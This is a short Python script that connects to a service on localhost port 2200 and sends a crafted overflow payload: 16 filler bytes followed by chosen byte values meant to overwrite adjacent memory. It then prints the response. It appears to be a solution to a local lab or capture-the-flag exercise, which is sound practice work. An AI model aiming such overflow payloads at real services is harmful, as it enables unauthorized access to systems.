import socket

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("localhost", 2200))
    payload = bytearray(16 * b'a')
    payload.append(0)
    payload.append(1)
    payload.append(1)
    payload.append(1)
    payload.append(1)
    payload += b'\n'
    data = s.recv(1024)
    s.sendall(payload)
    data = s.recv(1024)
    print("Response: %s" % data)
